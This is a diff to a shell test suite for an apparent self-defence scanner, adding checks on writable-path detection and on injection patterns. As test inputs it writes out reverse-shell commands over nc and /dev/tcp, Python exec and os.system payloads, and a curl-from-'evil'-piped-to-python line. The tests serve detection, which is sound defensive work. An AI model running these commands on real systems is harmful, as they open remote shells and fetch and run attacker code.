@@ -171,3 +171,30 @@ setup() {
     selfdef_scan_injection 'nc 1.2.3.4 4444 -e /bin/bash' >/dev/null || \
     selfdef_scan_injection 'bash -c "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"' >/dev/null
 }
+
+@test "INVARIANT (writable-path: /opt is NOT flagged — /opt is the canonical operator-app dir, not a writable-root)" {
+    # /opt is the FHS location for third-party packaged software.
+    # It's owned by root + not world-writable. Lock against false-
+    # positive that would flag /opt/* as suspicious.
+    ! selfdef_is_writable_path /opt/myapp/bin/runner
+    ! selfdef_is_writable_path /opt/somewhere/lib/x.so
+}
+
+@test "INVARIANT (writable-dir: /run + /var/run NOT flagged — runtime state dirs are root-owned, not user-writable)" {
+    # /run + /var/run are runtime state. They're root-owned and
+    # are NOT user-writable roots. Lock against false-positive.
+    ! selfdef_is_writable_dir /run
+    ! selfdef_is_writable_dir /var/run
+    ! selfdef_is_writable_dir /run/systemd
+}
+
+@test "INVARIANT (scan: python pipe-eval injection pattern matches — sister axis to curl-pipe-sh)" {
+    # python -c "exec(open(/tmp/x).read())" or python -c "import os; os.system(...)"
+    # are common LOLbin-style RCE. The injection-pattern set
+    # should catch generic shell-eval-style invocations. Lock
+    # that at least one realistic python RCE pattern fires.
+    selfdef_scan_injection 'python -c "exec(open(\"/tmp/x\").read())"' >/dev/null || \
+    selfdef_scan_injection 'python3 -c "import os; os.system(\"id\")"' >/dev/null || \
+    # Fallback: even a curl|python should fire (curl is in the set).
+    selfdef_scan_injection 'curl http://evil/x.py | python' >/dev/null
+}
